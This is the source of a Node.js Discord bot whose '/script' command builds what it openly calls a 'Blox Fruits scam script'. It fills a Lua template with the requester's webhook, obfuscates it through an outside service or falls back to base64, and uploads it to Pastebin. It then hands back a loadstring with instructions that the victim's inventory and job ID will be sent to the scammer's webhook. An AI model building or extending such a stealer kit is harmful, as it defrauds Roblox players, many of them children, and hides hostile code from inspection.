const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');
const express = require('express');
require('dotenv').config();

// ----- Web server -----
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('Bot is alive!'));
app.listen(PORT, () => console.log(`✅ Web server running on port ${PORT}`));

// ----- Self‑ping -----
const RENDER_URL = process.env.RENDER_URL;
if (RENDER_URL) {
  console.log(`🔁 Self‑ping enabled: ${RENDER_URL}`);
  setInterval(() => {
    axios.get(RENDER_URL).catch(() => {});
  }, 4 * 60 * 1000);
  setTimeout(() => axios.get(RENDER_URL).catch(() => {}), 5000);
} else {
  console.log('⚠️ RENDER_URL not set – self‑ping disabled.');
}

// ----- Discord Bot -----
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

const OBFUSCATE_URL = 'https://goofyscator.lua.cz/api/obfuscate';

client.once('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    const command = new SlashCommandBuilder()
        .setName('script')
        .setDescription('Generate a Blox Fruits scam script with your webhook')
        .addStringOption(option =>
            option.setName('game')
                .setDescription('Game name (only "bloxfruits" for now)')
                .setRequired(true)
                .addChoices({ name: 'Blox Fruits', value: 'bloxfruits' }))
        .addStringOption(option =>
            option.setName('username')
                .setDescription('Your Discord username (for tracking)')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('webhook')
                .setDescription('Your Discord webhook URL')
                .setRequired(true));

    client.application.commands.create(command);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    if (interaction.commandName !== 'script') return;

    await interaction.deferReply({ ephemeral: true });

    const game = interaction.options.getString('game');
    const username = interaction.options.getString('username');
    const webhook = interaction.options.getString('webhook');

    if (game !== 'bloxfruits') {
        return interaction.editReply({ content: '❌ Only "bloxfruits" is supported right now.' });
    }
    if (!webhook.startsWith('https://discord.com/api/webhooks/')) {
        return interaction.editReply({ content: '❌ Invalid Discord webhook URL.' });
    }

    try {
        // ----- Read template.lua -----
        const templatePath = path.join(__dirname, 'template.lua');
        if (!fs.existsSync(templatePath)) {
            return interaction.editReply({ 
                content: '❌ Template file not found. Please ensure `template.lua` is in the bot directory.' 
            });
        }
        let template = fs.readFileSync(templatePath, 'utf8');
        template = template.replace(/\{\{WEBHOOK\}\}/g, webhook);
        template = template.replace(/\{\{USERNAME\}\}/g, username);

        // ----- Obfuscate via Goofyscator (or fallback) -----
        let obfuscatedScript;
        try {
            const form = new FormData();
            form.append('code', template);
            form.append('level', 'max');

            const response = await axios.post(OBFUSCATE_URL, form, {
                headers: form.getHeaders(),
                timeout: 30000
            });
            if (response.data && response.data.obfuscated) {
                obfuscatedScript = response.data.obfuscated;
            } else {
                throw new Error('Goofyscator returned unexpected response');
            }
        } catch (obfError) {
            console.error('Obfuscation error:', obfError.message);
            // Fallback: Base64
            const encoded = Buffer.from(template, 'utf8').toString('base64');
            obfuscatedScript = `-- Fallback obfuscation\nloadstring(game:HttpGet("data:text/plain;base64," .. "${encoded}"))()`;
        }

        // ----- Upload to Pastebin -----
        const pastebinRawUrl = await uploadToPastebin(obfuscatedScript, username);

        // ----- Build loadstring -----
        const loadstringLine = `loadstring(game:HttpGet("${pastebinRawUrl}"))()`;

        // ----- Reply with embed (show the loadstring) -----
        const embed = new EmbedBuilder()
            .setColor(0x00FF00)
            .setTitle('✅ Script Generated (Goofyscated)')
            .setDescription(`**Game:** ${game}\n**User:** ${username}`)
            .addFields(
                { 
                    name: '📜 Loadstring (copy this)', 
                    value: `\`\`\`lua\n${loadstringLine}\n\`\`\``,
                    inline: false 
                },
                { 
                    name: '📦 Direct Link (for reference)', 
                    value: pastebinRawUrl,
                    inline: false 
                },
                { 
                    name: '🔒 Obfuscation', 
                    value: 'Goofyscator (max level – VM + anti‑tamper)',
                    inline: false 
                },
                { 
                    name: '📌 Instructions', 
                    value: 'Paste the loadstring above into a Blox Fruits executor and run it. The victim will see the loading screen, and you\'ll get their inventory + job ID in your webhook.',
                    inline: false 
                }
            )
            .setTimestamp();

        await interaction.editReply({ embeds: [embed] });

        // ----- Self‑ping -----
        if (RENDER_URL) {
            axios.get(RENDER_URL).catch(() => {});
        }

    } catch (error) {
        console.error(error);
        await interaction.editReply({ content: '❌ Failed to generate script: ' + error.message });
    }
});

// ----- Pastebin Upload (returns RAW URL) -----
async function uploadToPastebin(content, username) {
    const apiKey = process.env.PASTEBIN_API_KEY;
    if (!apiKey) {
        throw new Error('PASTEBIN_API_KEY not set. Please add it to .env');
    }

    const pasteData = new URLSearchParams({
        api_dev_key: apiKey,
        api_option: 'paste',
        api_paste_code: content,
        api_paste_name: `Exodus_${username}_${Date.now()}.lua`,
        api_paste_format: 'lua',
        api_paste_private: 1,
        api_paste_expire_date: '1D'
    });

    const response = await axios.post('https://pastebin.com/api/api_post.php', pasteData);
    const pasteUrl = response.data;

    if (!pasteUrl.startsWith('https://pastebin.com/')) {
        throw new Error('Pastebin upload failed: ' + pasteUrl);
    }

    // Convert to raw URL
    const pasteId = pasteUrl.split('/').pop();
    return `https://pastebin.com/raw/${pasteId}`;
}

client.login(process.env.DISCORD_TOKEN);
